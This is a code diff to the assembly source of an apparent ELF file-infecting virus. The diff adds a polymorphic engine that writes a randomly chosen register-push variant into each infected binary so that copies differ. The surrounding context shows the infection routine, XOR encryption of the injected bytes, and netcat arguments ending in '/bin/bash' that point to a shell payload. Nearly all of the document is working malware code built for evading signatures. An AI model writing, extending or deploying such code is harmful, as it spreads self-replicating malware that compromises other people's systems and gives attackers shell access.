@@ -9,7 +9,9 @@ _start:
 
 begin:
 	; save all registers
+POLY_push_regs_begin:
 	push rax
+POLY_push_regs_end:
 	push rdi
 	push rsi
 	push rdx
@@ -521,6 +523,9 @@ nc_arg6: db "/bin/bash", 0
 magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
 fingerprint_int: dd 0
+poly_push_regs_buffer: db 0x50, 0x50
+poly_push_regs_size: dq 1
+poly_push_regs_count: dq 2
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -993,6 +998,20 @@ treat_file:
 	add rdi, key_size - _start			; 	+ (key_size - _start)
 	mov qword [rdi], KEY_BYTE_SIZE			; *_key_size_ptr = KEY_BYTE_SIZE;
 
+	; replace injected push_regs by a random poly_push_regs
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_push_regs_count, poly_push_regs_size, poly_push_regs_buffer);
+	mov rsi, [rand_index]				; ...
+	mov rdx, [poly_push_regs_count]			; ...
+	mov rcx, [poly_push_regs_size]			; ...
+	lea r8, [poly_push_regs_buffer]			; ...
+	call get_variation_ptr				; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _poly_push_regs_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, POLY_push_regs_begin - _start		; 	+ (.POLY_push_regs_begin - _start)
+	mov rcx, [rel poly_push_regs_size]		; _poly_push_regs_size = poly_push_regs_size;
+	rep movsb					; memcpy(_poly_push_regs_ptr, variation_ptr, _poly_push_regs_size);
+
 	; xor cipher all injected bytes between infection_routine and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
 	add rdi, [filesize]				;
@@ -1031,6 +1050,26 @@ treat_file:
 	add rsp, %$localsize
 	pop rbp
 	%pop
+	ret
+
+; unsignec char *get_variation_ptr(unsigned int *rand_buffer, long *rand_index, unsigned int variation_count, unsigned int variation_size, unsigned char *variation_ptr);
+; rax get_variation_ptr(rdi rand_buffer, rsi rand_index, rdx variation_count, rcx variation_size, r8 variation_ptr);
+get_variation_ptr:
+	push r8
+	push rcx
+	push rdx
+	call rand					; rand_val = rand(rand_buffer, rand_index);
+
+	xor rdx, rdx					; rand_index (rdx) = rand_val % variation_count
+	pop rdi						; ...
+	div rdi						; ...
+
+	pop rdi						; rand_pos = rand_index * variation_size
+	imul rdx, rdi					; ...
+	
+	pop rsi						; _variation_ptr = variation_ptr
+	add rsi, rdx					; _variation_ptr += rand_pos
+	mov rax, rsi					; return _variation_ptr
 	ret
 
 ; Elf64_Addr get_next_available_vaddr(char const *file_map);
